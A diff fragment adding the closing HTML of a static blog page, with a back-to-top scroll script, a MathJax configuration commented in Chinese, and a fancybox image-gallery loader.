+      clearInterval(timer);
+    } else {
+      document.documentElement.scrollTop = scrollTop - step;
+      document.body.scrollTop = scrollTop - step;
+    }
+  }, delay);
+}
+
+document.addEventListener("scroll", handleScoll(), false);
+
+document.querySelector(".back-to-top").addEventListener("click", backToTop, false);
+
+</script>
+
+    </div>
+
+    
+      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  (() => {
+    const mathjaxConfig = {
+      showProcessingMessages: false, //关闭js加载过程信息
+      messageStyle: "none", //不显示信息
+      jax: ["input/TeX", "output/HTML-CSS"],
+      tex2jax: {
+        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
+        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
+        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
+      },
+      "HTML-CSS": {
+        availableFonts: ["STIX", "TeX"], //可选字体
+        showMathMenu: false //关闭右击菜单显示
+      }
+    }
+
+    let mathjaxInterval = setInterval(() => {
+      if(!window.MathJax){
+        return;
+      }
+      window.MathJax.Hub.Config(mathjaxConfig)
+      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])
+
+      clearInterval(mathjaxInterval)
+    }, 10)    
+  })()
+</script>
+    
+
+    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
+<script async>
+  let fancyTimer = setInterval(function(){
+    if(!window.$){
+      return;
+    }
+    $(document).ready(function() {
+      $(".post img").each(function () {
+        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
+          return;
+        }
+        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "gallery");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      });
+      
+      clearInterval(fancyTimer);
+    });
+  }, 10);
+</script>
+
+    
+  </body>
+
+</html>
